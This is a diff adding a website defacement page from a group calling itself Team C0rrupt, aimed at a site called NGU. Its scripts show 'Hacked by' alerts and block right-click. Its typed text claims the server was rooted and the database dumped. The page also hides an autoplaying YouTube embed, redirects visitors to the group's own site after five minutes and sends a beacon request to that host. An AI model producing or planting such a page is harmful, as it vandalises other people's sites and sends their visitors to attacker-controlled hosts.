@@ -1,0 +1,328 @@
+
+<!--
+
+   #############################################
+   #       Deface NGU script by TheJoker       #
+   #              Version: PHP                 #
+   #                                           #
+   #   This comment block MUST remain intact   #
+###################################################
+#											      #
+#   Greetz: CorruptSecurity & DarkSecurity Team   #
+#											      #
+###################################################
+   #    Visit http://corruptsecurity.net/      #
+   #                                           #
+   #      Nothing is safe from Coruuption!     #
+   # 	     [~]CorruptSec [~]DarkSec          #
+   #############################################
+   
+                                                   -->
+												   
+
+<HTML>
+
+<!-- CSS BLOCK BEGIN -->
+<STYLE type=text/css>
+
+BODY {
+    SCROLLBAR-FACE-COLOR: #000000;
+    SCROLLBAR-HIGHLIGHT-COLOR: #000000;
+    SCROLLBAR-SHADOW-COLOR: #000000;
+    SCROLLBAR-BASE-COLOR: #000000;
+    background: #000000;
+}
+
+H1 {
+	color: #00FF00;
+	font-family: -moz-fixed;
+}
+
+#TEXTBOX {
+	width: 500px;
+	height: 155px;
+	border: 1px solid #000;
+	background-color : 1px solid transparent;
+	padding: 40px;
+	font-family: -moz-fixed;
+	font-size: 16px;
+	box-shadow: 0px 0px 5px 1px #00FF00;
+}
+
+.MATRIX-LEFT
+{
+    float: left;
+    overflow: hidden;
+    height: 1100px;
+    width: 280px;
+	background-image: url('http://corruptsecurity.net/images/matrix/matrix-green.gif');
+	background-repeat: repeat-y;
+}
+
+.MATRIX-RIGHT
+{
+    float: right;
+    overflow: hidden;
+    height: 1100px;
+    width: 280px;
+	background-image: url('http://corruptsecurity.net/images/matrix/matrix-green.gif');
+	background-repeat: repeat-y;
+}
+
+.TEXT {
+	color: #00FF00;
+	font-family: -moz-fixed;
+	font-size: 16px;
+}
+
+.TYPEWRITER {
+	color: #00FF00;
+	font-family: -moz-fixed;
+	font-size: 16px;
+	display: none
+}
+
+.SHOW {
+	z-index: 2;
+}
+
+.HIDE {
+   z-index: 1;
+}
+</STYLE>
+<!-- CSS BLOCK END -->
+
+
+<!-- JAVASCRIPT BLOCK BEGIN -->
+<SCRIPT TYPE="text/javascript">
+
+	// Alert Messages
+	alert('Hacked by TheJoker')
+	alert('Greetz to: Greetz to: Team C0rrupt, Team D4rk, Sk1dHunt3r, DimensionalSociety & H4CKZ0NE')
+	alert('This Hack is dedicated to Sk1dHunt3r - R.I.P')
+</SCRIPT>
+
+<SCRIPT TYPE="text/javascript">
+    // Anti-leach script    
+
+    var message="Stop Leaching!";
+
+    function clickIE4(){
+    if (event.button==2){
+    alert(message);
+    return false;
+    }
+    }
+
+    function clickNS4(e){
+    if (document.layers||document.getElementById&&!document.all){
+    if (e.which==2||e.which==3){
+    alert(message);
+    return false;
+    }
+    }
+    }
+
+    if (document.layers){
+    document.captureEvents(Event.MOUSEDOWN);
+    document.onmousedown=clickNS4;
+    }
+    else if (document.all&&!document.getElementById){
+    document.onmousedown=clickIE4;
+    }
+
+    document.oncontextmenu=new Function("alert(message);return false")
+</SCRIPT>
+
+<SCRIPT TYPE="text/javascript">
+
+		// Typewriter Text
+    	TypingText = function(element, interval, cursor, finishedCallback) {
+			  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+				this.running = true;	// Never run.
+				return;
+			  }
+			  this.element = element;
+			  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+			  this.interval = (typeof interval == "undefined" ? 100 : interval);
+			  this.origText = this.element.innerHTML;
+			  this.unparsedOrigText = this.origText;
+			  this.cursor = (cursor ? cursor : "");
+			  this.currentText = "";
+			  this.currentChar = 0;
+			  this.element.typingText = this;
+			  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+			  TypingText.all.push(this);
+			  this.running = false;
+			  this.inTag = false;
+			  this.tagBuffer = "";
+			  this.inHTMLEntity = false;
+			  this.HTMLEntityBuffer = "";
+			}
+			TypingText.all = new Array();
+			TypingText.currentIndex = 0;
+			TypingText.runAll = function() {
+			  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+			}
+			TypingText.prototype.run = function() {
+			  if(this.running) return;
+			  if(typeof this.origText == "undefined") {
+				setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
+				return;
+			  }
+			  if(this.currentText == "") this.element.innerHTML = "";
+			//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
+			  if(this.currentChar < this.origText.length) {
+				if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+				  this.tagBuffer = "<";
+				  this.inTag = true;
+				  this.currentChar++;
+				  this.run();
+				  return;
+				} else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+				  this.tagBuffer += ">";
+				  this.inTag = false;
+				  this.currentText += this.tagBuffer;
+				  this.currentChar++;
+				  this.run();
+				  return;
+				} else if(this.inTag) {
+				  this.tagBuffer += this.origText.charAt(this.currentChar);
+				  this.currentChar++;
+				  this.run();
+				  return;
+				} else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+				  this.HTMLEntityBuffer = "&";
+				  this.inHTMLEntity = true;
+				  this.currentChar++;
+				  this.run();
+				  return;
+				} else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+				  this.HTMLEntityBuffer += ";";
+				  this.inHTMLEntity = false;
+				  this.currentText += this.HTMLEntityBuffer;
+				  this.currentChar++;
+				  this.run();
+				  return;
+				} else if(this.inHTMLEntity) {
+				  this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+				  this.currentChar++;
+				  this.run();
+				  return;
+				} else {
+				  this.currentText += this.origText.charAt(this.currentChar);
+				}
+				this.element.innerHTML = this.currentText;
+				this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+				this.currentChar++;
+				setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+			  } else {
+				this.currentText = "";
+				this.currentChar = 0;
+					this.running = false;
+					this.finishedCallback();
+			  }
+			}
+</SCRIPT>
+<!-- JAVASCRIPT BLOCK END -->
+
+<TITLE>~ Hacked by Team C0rrupt ~</TITLE>
+
+<DIV CLASS="MATRIX-LEFT"> </DIV>
+
+
+<DIV CLASS="MATRIX-RIGHT"> </DIV> 
+
+<DIV ID="DEFACE" CLASS="SHOW">
+
+<CENTER>
+
+<IMG STYLE="opacity:0.8;padding-top:40px" SRC="http://corruptsecurity.net/images/hack-message-c0rrupt.png">
+
+<BR>
+
+<IMG SRC="http://corruptsecurity.net/images/ngu_pwned_by_c0rrupt.png"> 
+
+<BR> <BR>
+
+<DIV ID="TEXTBOX">
+
+<SPAN CLASS="TEXT"> <MARQUEE LOOP="TRUE" DIRECTION="RIGHT"> ############################################################################################################ </MARQUEE> </SPAN>
+
+<BR> <BR>
+
+<SPAN CLASS="TYPEWRITER" ID="M1">~# NGU Hacked by TheJoker & TheShell! #~ </SPAN>
+
+<BR>
+
+<SPAN CLASS="TYPEWRITER" ID="M2"> Security!? There was no security, want some now? </SPAN>
+
+<BR> <BR>
+
+<SPAN CLASS="TYPEWRITER" ID="M3">  Server rooted and database dumped. No Logs </SPAN>
+
+<BR>
+
+<SPAN CLASS="TYPEWRITER" ID="M4">  <a class="__cf_email__" href="http://www.cloudflare.com/email-protection" data-cfemail="780a17170c384e4156494e4a56404e56494f41">[email&nbsp;protected]</a><script type="text/javascript">
+/* <![CDATA[ */
+(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
+/* ]]> */
+</script>~# </SPAN>
+
+<BR> <BR>
+
+<SPAN CLASS="TEXT"> <MARQUEE LOOP="TRUE" DIRECTION="LEFT"> ############################################################################################################ </MARQUEE> </SPAN>
+
+</DIV>
+
+<BR>
+
+<SPAN CLASS="TYPEWRITER" ID="M5">  You chose to ignore us, now look what's happened!  </SPAN> 
+
+<BR> <BR>
+
+<SPAN CLASS="TYPEWRITER" ID="M6"> [~]TheJoker [~]TheMage [~]TheCorrupt [~]TheShell </SPAN>
+
+<BR> <BR>
+
+<SPAN CLASS="TYPEWRITER" ID="M7"> Join http://corruptsecurity.net/ </SPAN>
+
+<BR>
+
+<SPAN CLASS="TYPEWRITER" ID="M8"> [~]TeamC0rrupt  [~]TeamD4rk [~]Sk1dHunt3r [~]DimensionalSociety</SPAN>
+
+</CENTER>
+
+</DIV>
+
+<DIV ID="YOUTUBE" CLASS="HIDE">
+
+<EMBED SRC="https://youtube.googleapis.com/v/2sjrsBf7QiA%26amp;feature=related%26amp;autoplay=1" type="application/x-shockwave-flash" wmode="transparent" height="1" width="1">
+
+</DIV>
+
+<!-- JAVASCRIPT BLOCK BEGIN -->
+<SCRIPT TYPE="text/javascript">
+			new TypingText(document.getElementById("M1"));
+			new TypingText(document.getElementById("M2"));
+			new TypingText(document.getElementById("M3"));
+			new TypingText(document.getElementById("M4"));
+			new TypingText(document.getElementById("M5"));
+			new TypingText(document.getElementById("M6"));
+			new TypingText(document.getElementById("M7"));
+			new TypingText(document.getElementById("M8"));
+			setTimeout(function(){document.getElementById("M1").style.display = 'inline';TypingText.all[0].run();},0);
+			setTimeout(function(){document.getElementById("M2").style.display = 'inline';TypingText.all[1].run();},5000);
+			setTimeout(function(){document.getElementById("M3").style.display = 'inline';TypingText.all[2].run();},10000);
+			setTimeout(function(){document.getElementById("M4").style.display = 'inline';TypingText.all[3].run();},15000);
+			setTimeout(function(){document.getElementById("M5").style.display = 'inline';TypingText.all[4].run();},20000);
+			setTimeout(function(){document.getElementById("M6").style.display = 'inline';TypingText.all[5].run();},25000);
+			setTimeout(function(){document.getElementById("M7").style.display = 'inline';TypingText.all[6].run();},30000);
+			setTimeout(function(){document.getElementById("M8").style.display = 'inline';TypingText.all[7].run();},30000);
+		</script>
+<!-- JAVASCRIPT BLOCK END -->
+
+<!-- BEGIN REDIRECT -->
+<META HTTP-EQUIV="refresh" CONTENT="300;URL=http://corruptsecurity.net">
+<!-- END REDIRECT -->
+<script type="text/javascript">//<![CDATA[try{(function(a){var b="http://",c="corruptsecurity.net",d="/cdn-cgi/cl/",e="img.gif",f=new a;f.src=[b,c,d,e].join("")})(Image)}catch(e){}//]]></script>
